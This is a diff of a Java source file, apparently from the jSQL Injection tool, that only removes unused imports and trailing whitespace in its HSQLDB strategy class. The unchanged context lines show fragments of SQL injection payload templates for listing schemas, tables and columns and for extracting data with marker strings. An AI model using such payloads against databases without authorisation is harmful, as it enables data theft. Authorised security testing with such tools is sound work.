@@ -1,12 +1,10 @@
 package com.jsql.model.vendor;
 
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 
 import com.jsql.model.bean.Database;
 import com.jsql.model.bean.Table;
-import com.jsql.model.blind.ConcreteTimeInjection;
 import com.jsql.model.injection.MediatorModel;
 import com.jsql.tool.ToolsString;
 
@@ -14,7 +12,7 @@ public class HSQLDBStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return 
+        return
             "select+concat(" +
                 "" +
                     "concat_ws(" +
@@ -32,7 +30,7 @@ public class HSQLDBStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaList() {
-        return 
+        return
             "select+" +
                 "concat(" +
                     "group_concat(" +
@@ -58,7 +56,7 @@ public class HSQLDBStrategy extends ASQLStrategy {
 
     @Override
     public String getTableList(Database database) {
-        return 
+        return
             "select+" +
                 "concat(" +
                     "group_concat(" +
@@ -83,7 +81,7 @@ public class HSQLDBStrategy extends ASQLStrategy {
 
     @Override
     public String getColumnList(Table table) {
-        return 
+        return
             "select+" +
                 "concat(" +
                     "group_concat(" +
@@ -119,7 +117,7 @@ public class HSQLDBStrategy extends ASQLStrategy {
         
         formatListColumn = "trim(ifnull(convert(" + formatListColumn + ",SQL_VARCHAR),'%00'))";
         
-        return 
+        return
             "select+concat(" +
                 "group_concat(" +
                     "'%04'||" +
@@ -142,7 +140,7 @@ public class HSQLDBStrategy extends ASQLStrategy {
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
-        return 
+        return
             "select'SQLi'||substr(r," + startPosition + "," +
                 /**
                  * Minus 'SQLi' should apply
@@ -153,7 +151,7 @@ public class HSQLDBStrategy extends ASQLStrategy {
 
     @Override
     public String performanceQuery(String[] indexes) {
-        return 
+        return
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
                 "('SQLi'||$1||repeat('%23',1024)||'iLQS')"
